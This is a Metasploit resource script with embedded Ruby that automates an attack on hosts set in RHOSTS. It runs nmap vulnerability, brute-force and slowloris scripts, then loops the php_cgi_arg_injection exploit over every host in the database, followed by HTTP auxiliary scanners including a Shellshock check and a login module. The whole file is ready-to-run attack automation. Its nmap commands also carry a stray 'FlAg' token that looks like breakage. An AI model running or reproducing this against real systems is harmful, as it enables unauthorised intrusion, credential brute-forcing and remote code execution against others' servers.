<ruby>
print_line("")
print_status("Please wait, checking if RHOSTS are set globally...")
  # Check for rhosts in metasploit database
  if (framework.datastore['RHOSTS'] == nil)
    print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")
    return nil
  end

  # Using nmap to 'gather information' about target services
  print_good("RHOSTS set globally [ OK ] running scans...")
    run_single("nmap FlAg -T2 -Pn --reason --script banner.nse,http-vuln-cve2011-3192.nse,http-shellshock.nse,phpipam.nse,ms15-034.nse,file-checker.nse --script-args read=true -p 80 #{framework.datastore['RHOSTS']}")
    print_line("")
      # Using nmap to populate metasploit database
      print_good("Please wait, running vulnerability scans...")
      run_single("nmap FlAg -T2 -Pn --reason --script http-stored-xss.nse,http-csrf.nse,http-sql-injection.nse,http-slowloris.nse,http-brute.nse,dns-brute.nse,ip-geolocation-geoplugin.nse -p 80 #{framework.datastore['RHOSTS']}")
      print_line("")

  # loop funtion to exploit PHP CGI ARGUMENT INJECTION...
  print_good("Please wait, trying to exploit PHP CGI ARGUMENT INJECTION")
    framework.db.hosts.each do |host|
      run_single("use exploit/multi/http/php_cgi_arg_injection ")
      run_single("set RHOST #{host.address}")
      run_single("exploit")
    end
    print_line("")
    run_single("db_nmap FlAg -O -Pn -p 80 #{framework.datastore['RHOSTS']}")
  print_line("")
  print_good("Please wait, running msf auxiliary modules...")
</ruby>


# Running msf auxiliary modules...
use auxiliary/scanner/http/http_version
run
use auxiliary/scanner/http/options
run
use auxiliary/scanner/http/cert
run
use auxiliary/scanner/http/ssl
run
use auxiliary/scanner/http/apache_mod_cgi_bash_env
run
use auxiliary/scanner/http/dir_scanner
run
use auxiliary/scanner/http/http_login
show options


